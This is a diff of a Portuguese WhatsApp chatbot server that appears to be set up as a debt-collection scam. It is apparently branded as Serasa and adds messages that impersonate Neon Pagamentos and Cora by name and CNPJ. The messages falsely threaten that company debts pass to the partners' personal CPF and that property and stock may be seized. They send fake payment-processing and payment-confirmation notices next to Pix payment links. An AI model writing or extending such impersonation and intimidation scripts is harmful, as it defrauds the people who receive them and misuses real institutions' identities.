@@ -62,7 +62,7 @@ let isConnected = false;
 
 // Configuração do cliente com caminhos absolutos
 const client = new Client({
-  authStrategy: new LocalAuth({ clientId: "serasa" }), // Mantenha apenas isso
+  authStrategy: new LocalAuth(), // Mantenha apenas isso
   puppeteer: {
     headless: true,
     args: [
@@ -94,11 +94,11 @@ const client = new Client({
 });
 
 // Verificação em tempo real
-client.on('authenticated', () => {
+/*client.on('authenticated', () => {
   console.log('✅ Sessão salva em:', path.join(AUTH_DIR, SESSION_NAME));
   console.log('Conteúdo:', fs.readdirSync(path.join(AUTH_DIR, SESSION_NAME)));
 });
-
+*/
 
 // requisições do cors
 app.use(cors({
@@ -149,7 +149,7 @@ client.on('ready', () => {
   console.log('✅ Chatbot conectado com sucesso!');
 });
 
-client.on('auth_failure', msg => {
+/*client.on('auth_failure', msg => {
   isConnected = false;
   console.error('❌ Falha de autenticação:', msg);
 });
@@ -159,11 +159,11 @@ client.on('disconnected', reason => {
   qrBase64 = '';
   console.log('🔌 Desconectado do WhatsApp:', reason);
 });
-
+*/
 
 const httpsServer = https.createServer(credentials, app);
   httpsServer.listen(PORT, () => {
-    console.log(`🌐 Servidor iniciado em http://localhost:${PORT}`);
+    console.log(`🌐 Servidor iniciado em https://atentus.com.br:${PORT}\nAcesse: https://atentus.com.br/eva/serasanovo/serasabot/public/`);
   });
 
 
@@ -279,6 +279,71 @@ async function processarMensagens(msg) {
         await delay(1500);
         await client.sendMessage(msg.from, img, { caption: texto });
     };
+
+
+    const imgNeon = MessageMedia.fromFilePath('./assets/neon_img.jpg');
+    const imgCora = MessageMedia.fromFilePath('./assets/cora_img.jpg');
+
+    async function msgNeonAnalise() {
+        const img = imgNeon;
+        const mensagem = "🏢 *Neon Pagamentos S.A.*\n\
+📄 *CNPJ:* 29.855.875/0001-82\n\n\
+⚠️ *Atenção:* Débitos registrados no *CNPJ* serão automaticamente transferidos para o *CPF dos sócios devedores*.\n\n\
+🔒 Após a negativação, todos os *bens ativos* poderão ser bloqueados para quitação dos débitos junto às redes bancárias de cartões de crédito.\n\
+🏠 *Imóveis*, 📦 *estoques* e outros ativos poderão ser convertidos em pagamento aos credores.\n\n\
+💳 *Status do Pagamento:*\n\
+⏳ Seu pagamento está em *análise para baixa*.\n\
+🔄 *Baixa em processamento.*\n\
+📌 Por favor, aguarde a confirmação.";
+
+        await enviarMensagemInicial(img, mensagem);
+
+    }
+
+    async function msgCoraAnalise() {
+        const img = imgCora;
+        const mensagem = "🏢 *Cora Sociedade de Crédito, Financiamento e Investimento S.A.*\n\
+📄 *CNPJ:* 37.880.206/0001-63\n\n\
+⚠️ *Atenção:* Débitos registrados no *CNPJ* serão automaticamente transferidos para o *CPF dos sócios devedores*.\n\n\
+🔒 Após a negativação, todos os *bens ativos* poderão ser bloqueados para quitação dos débitos junto às redes bancárias de cartões de crédito.\n\
+🏠 *Imóveis*, 📦 *estoques* e outros ativos poderão ser convertidos em pagamento aos credores.\n\n\
+💳 *Status do Pagamento:*\n\
+⏳ Seu pagamento está em *análise para baixa*.\n\
+🔄 *Baixa em processamento.*\n\
+📌 Por favor, aguarde a confirmação.";
+
+        await enviarMensagemInicial(img, mensagem);
+
+    }
+
+    async function msgNeonConfirmado() {
+        const img = imgNeon;
+        const mensagem = "🏢 *Neon Pagamentos S.A.*\n\
+📄 *CNPJ:* 29.855.875/0001-82\n\n\
+🎉 *Pagamento Confirmado!*\n\
+💳 Seu pagamento foi *processado com sucesso* e a baixa foi realizada.\n\n\
+📌 Situação regularizada junto às redes bancárias de cartões de crédito.\n\
+🔓 Nenhuma ação adicional é necessária no momento.\n\n\
+📅 Obrigado por manter seus débitos em dia!";
+
+        await enviarMensagemInicial(img, mensagem);
+
+    }
+
+    async function msgCoraConfirmado() {
+        const img = imgCora;
+        const mensagem = "🏢 *Cora Sociedade de Crédito, Financiamento e Investimento S.A.*\n\
+📄 *CNPJ:* 37.880.206/0001-63\n\n\
+🎉 *Pagamento Confirmado!*\n\
+💳 Seu pagamento foi *processado com sucesso* e a baixa foi realizada.\n\n\
+📌 Situação regularizada junto às redes bancárias de cartões de crédito.\n\
+🔓 Nenhuma ação adicional é necessária no momento.\n\n\
+📅 Obrigado por manter seus débitos em dia!";
+
+        await enviarMensagemInicial(img, mensagem);
+
+    }
+
 
     const from = msg.from;
     const mensagem = msg.body || msg.from.endsWith('@c.us');
@@ -671,58 +736,87 @@ async function processarMensagens(msg) {
             return;
 
         }
-    }else if (userState.step === 6) {
-        const protocoloBuscado = msg.body.trim();
-    
-        fs.readFile('data.txt', 'utf-8', async (err, data) => {
-            if (err) {
-                await enviarMensagemTexto('❌ Erro ao ler os dados. Tente novamente mais tarde.');
-                await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
-                state[from] = { step: 3 };
-                return;
-            }
-    
-            const linhas = data.split('\n').filter(l => l.trim() !== '');
-            const resultado = linhas.find(linha => linha.startsWith(protocoloBuscado + ';'));
-    
-            if (!resultado) {
-                await enviarMensagemTexto('🔍 Protocolo não encontrado. Verifique o número e tente novamente.');
-                await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
-                state[from] = { step: 3 };
-                return;
-            }
-    
-            const [protocolo, nome, cnpj, mensagemCliente, msgPadrao] = resultado.split(';');
-            const imagemBaixado = MessageMedia.fromFilePath('./assets/img_baixado.jpg');
+   } else if (userState.step === 6) {
+    const protocoloBuscado = msg.body.trim();
 
-            if (msgPadrao === 'true') {
-                await enviarMensagemInicial(imagemBaixado, `📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* Seu título foi baixado com sucesso.`);
-                await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
-                state[from] = { step: 3 };
+    fs.readFile('data.txt', 'utf-8', async (err, data) => {
+        if (err) {
+            await enviarMensagemTexto('❌ Erro ao ler os dados. Tente novamente mais tarde.');
+            await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+            state[from] = { step: 3 };
+            return;
+        }
 
-            }else if(pixUm === 'true'){
-                await enviarMensagemInicial(imagemBaixado, `📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* Seu título foi baixado com sucesso.`);
-                enviarMensagemInicial(imagemPix, msgPix);
-                enviarMensagemTexto(linkPixUm);
-                await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
-                state[from] = { step: 3 };
+        const linhas = data.split('\n').filter(l => l.trim() !== '');
+        const resultado = linhas.find(linha => linha.startsWith(protocoloBuscado + ';'));
 
-            }else if(pixDois === 'true'){
-                await enviarMensagemInicial(imagemBaixado, `📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* Seu título foi baixado com sucesso.`);
-                enviarMensagemInicial(imagemPix, msgPix);
-                enviarMensagemTexto(linkPixDois);
-                await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
-                state[from] = { step: 3 };
-                
-            }else{
-                await enviarMensagemTexto(`📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* ${mensagemCliente}`);
-                await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
-                state[from] = { step: 3 };
-            }
-    
-          });
-        return;
-    }else if(userState.step === 7){
+        if (!resultado) {
+            await enviarMensagemTexto('🔍 Protocolo não encontrado. Verifique o número e tente novamente.');
+            await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+            state[from] = { step: 3 };
+            return;
+        }
+
+        const campos = resultado.split(';');
+        const [protocolo, nome, cnpj, mensagemCliente, msgPadrao, pixUm, pixDois] = campos;
+        
+        // Verifica se existem os novos campos (compatibilidade com dados antigos)
+        const neonProcessamento = campos[7] || 'false';
+        const neonConfirmado = campos[8] || 'false';
+        const coraProcessamento = campos[9] || 'false';
+        const coraConfirmado = campos[10] || 'false';
+
+        const imagemBaixado = MessageMedia.fromFilePath('./assets/img_baixado.jpg');
+
+        // Verifica primeiro as condições das mensagens Neon e Cora
+        if (neonProcessamento === 'true') {
+            await msgNeonAnalise();
+            await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+            state[from] = { step: 3 };
+
+        } else if (neonConfirmado === 'true') {
+            await msgNeonConfirmado();
+            await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+            state[from] = { step: 3 };
+
+        } else if (coraProcessamento === 'true') {
+            await msgCoraAnalise();
+            await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+            state[from] = { step: 3 };
+
+        } else if (coraConfirmado === 'true') {
+            await msgCoraConfirmado();
+            await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+            state[from] = { step: 3 };
+
+        // Condições existentes (msgPadrao, pixUm, pixDois)
+        } else if (msgPadrao === 'true') {
+            await enviarMensagemInicial(imagemBaixado, `📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* Seu título foi baixado com sucesso.`);
+            await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+            state[from] = { step: 3 };
+
+        } else if (pixUm === 'true') {
+            await enviarMensagemInicial(imagemBaixado, `📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* Seu título foi baixado com sucesso.`);
+            enviarMensagemInicial(imagemPix, msgPix);
+            enviarMensagemTexto(linkPixUm);
+            await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+            state[from] = { step: 3 };
+
+        } else if (pixDois === 'true') {
+            await enviarMensagemInicial(imagemBaixado, `📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* Seu título foi baixado com sucesso.`);
+            enviarMensagemInicial(imagemPix, msgPix);
+            enviarMensagemTexto(linkPixDois);
+            await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+            state[from] = { step: 3 };
+
+        } else {
+            await enviarMensagemTexto(`📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* ${mensagemCliente}`);
+            await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+            state[from] = { step: 3 };
+        }
+    });
+    return;
+}else if(userState.step === 7){
         if (msg.body === tjspKey){
             await enviarMensagemTexto(msgPadraoTjsp);
             await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
